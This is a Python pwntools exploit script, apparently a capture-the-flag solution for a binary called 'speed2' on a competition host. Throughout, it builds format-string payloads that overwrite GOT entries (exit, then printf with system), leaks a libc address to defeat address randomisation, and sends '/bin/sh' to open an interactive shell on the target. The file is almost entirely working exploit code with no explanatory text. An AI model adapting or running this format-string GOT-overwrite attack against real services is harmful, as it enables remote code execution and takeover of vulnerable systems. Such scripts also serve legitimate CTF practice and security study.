#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'speed-02.hfsc.tf', 21000
binary = './ld-2.31.so ./speed2'.split()
brkpts = '''
'''

elf = ELF("speedmod")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "i386"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

def get_length(a,b):
    while hex(a)[-4:]!=b:
        a = a + 1
    return a

def fstring_payload32(addr,offset,waddr):
    addr = hex(addr).replace("0x","")
    if len(addr) < 8:
        addr = addr.rjust(8,"0")
    var1 = int(addr[-4:],16) - 10
    s2 = addr[-8:-4]
    var2 = get_length(var1,s2) - var1 - 10
    payload = "%{}c%{}$hn%{}c%{}$hn".format(var1,offset+9,var2,offset+10).ljust(40,"a")
    payload += p32(waddr) 
    payload += p32(waddr+2)
    return payload

def fstring_payload32_2(addr,offset,waddr):
    addr = hex(addr).replace("0x","")
    if len(addr) < 8:
        addr = addr.rjust(8,"0")
    var1 = int(addr[-4:],16)
    s2 = addr[-8:-4]
    var2 = get_length(var1,s2) - var1
    payload = "%{}c%{}$hn%{}c%{}$hn".format(var1,offset+8,var2,offset+9).ljust(40,"a")
    payload += p32(waddr) 
    payload += p32(waddr+2)
    return payload

def fstring_payload32_3(addr,offset,waddr):
    addr = hex(addr).replace("0x","")
    if len(addr) < 8:
        addr = addr.rjust(8,"0")
    var1 = int(addr[-4:],16)
    s2 = addr[-8:-4]
    var2 = get_length(var1,s2) - var1
    payload = "%{}c%{}$hn%{}c%{}$hn".format(var1,offset+9,var2,offset+10).ljust(40,"a")
    payload += p32(waddr) 
    payload += p32(waddr+2)
    return payload

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc.so.6'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

if __name__ == "__main__":
    reu("f5b: ")
    gdb.attach(io)
    exit_got = elf.got['exit']
    puts_got = elf.got['puts']
    printf_got = elf.got['printf']
    alarm_got = elf.got['alarm']
    main = 0x804928f
    fn = 0x8049318
    payload = "%2$p" + fstring_payload32(main, 9, exit_got)
    sl(payload)

    libc.address = int(re(10), 16) - libc.symbols['_IO_2_1_stdin_']

    log.info("libc @ "+hex(libc.address))
    # reu("f5b: ")
    gadget = libc.address + 0x141f64
    system = libc.symbols['system']

    payload = fstring_payload32_2(fn, 9, exit_got)
    sl(payload)
    sleep(1)

    payload = fstring_payload32_3(system, 9, printf_got)
    sl(payload)
    sleep(1)

    sl("/bin/sh\x00")

    io.interactive()
